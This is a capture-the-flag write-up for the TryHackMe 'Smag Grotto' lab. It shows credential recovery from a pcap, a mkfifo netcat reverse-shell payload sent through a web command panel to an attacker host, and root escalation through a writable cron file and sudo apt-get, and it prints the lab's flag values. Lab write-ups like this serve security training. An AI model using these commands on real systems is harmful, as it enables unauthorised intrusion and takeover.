# Smag Grotto - TryHackMe

Linux Ubuntu 16.04 machine with HTTP and SSH exposed. The attack path requires analyzing a network capture file to recover credentials, exploiting a command execution panel for initial access, then chaining two privilege escalation vectors: a writable cron job that controls SSH authorized keys, and a sudo misconfiguration on `apt-get`.

---

## Enumeration

### Network Scanning

```bash
nmap -sC -sV <target_ip>
```

Open ports:

- 22/tcp - SSH
- 80/tcp - HTTP

### Directory Enumeration

```bash
gobuster dir -u http://<target_ip> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

Result: `/mail` (Status 301)

### PCAP Analysis

The `/mail` path contained a link to a downloadable `.pcap` file. After downloading it:

```bash
wget http://<target_ip>/mail/<file>.pcap
wireshark <file>.pcap
```

Following the TCP stream revealed an HTTP POST request with credentials submitted in cleartext to `/login.php`, along with the virtual host: `development.smag.thm`.

Added the entry to `/etc/hosts`:

```
<target_ip>   development.smag.thm
```

---

## Initial Access

### Web Login

Accessed `http://development.smag.thm/login.php` with the credentials recovered from the pcap. The panel exposes a server-side command execution interface with no input validation.

### Reverse Shell

Set up a listener on the attack box:

```bash
nc -lvnp 1234
```

Sent a `mkfifo` reverse shell payload through the web panel:

```bash
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc <attacker_ip> 1234 >/tmp/f
```

Shell obtained as `www-data`.

---

## Privilege Escalation

### Cron Job Injection (www-data to jake)

Reviewing `/etc/crontab` revealed a root-owned job running every minute:

```bash
* * * * * root cp /opt/.backups/jake_id_rsa.pub.backup /home/jake/.ssh/authorized_keys
```

The file `/opt/.backups/jake_id_rsa.pub.backup` was writable by `www-data`. By replacing its contents with a controlled SSH public key, the cron job would propagate it to jake's `authorized_keys` within one minute.

Generated an SSH key pair on the attack box:

```bash
ssh-keygen -t rsa -f jake_key
```

Wrote the public key to the backup file via the `www-data` shell:

```bash
echo "<public key content>" > /opt/.backups/jake_id_rsa.pub.backup
```

After the cron fired, connected as jake:

```bash
ssh -i jake_key jake@<target_ip>
```

User flag:

```
iusGorV7EbmxM5AuIe2w499msaSuqU3j
```

### sudo apt-get via GTFOBins (jake to root)

```bash
sudo -l
```

Output:

```
(ALL : ALL) NOPASSWD: /usr/bin/apt-get
```

`apt-get` supports a `Pre-Invoke` option that executes a shell command before running the package manager. Using the GTFOBins technique:

```bash
sudo apt-get update -o APT::Update::Pre-Invoke::="/bin/sh"
```

Root shell obtained.

Root flag:

```
uJr6zRgetaniyHVRqqL58uRasybBKz2T
```

---

## Flags

```
user.txt  -> iusGorV7EbmxM5AuIe2w499msaSuqU3j
root.txt  -> uJr6zRgetaniyHVRqqL58uRasybBKz2T
```

---

## Key Takeaways

- A `.pcap` file exposed over HTTP without authentication is a realistic finding in internal network assessments - credentials in cleartext are the common result.
- Virtual host discovery is part of enumeration, not just directory busting; reading traffic and modifying `/etc/hosts` is a required step in multi-vhost environments.
- A cron job that copies a world-writable file into `authorized_keys` as root is both a persistence mechanism and an immediate privilege escalation vector.
- `apt-get` with `sudo NOPASSWD` is an instant escalation via GTFOBins - no exploit needed, just abusing package manager configuration hooks.

---

## Disclaimer

This lab was completed in a controlled environment provided by TryHackMe. All actions were performed strictly for educational purposes.
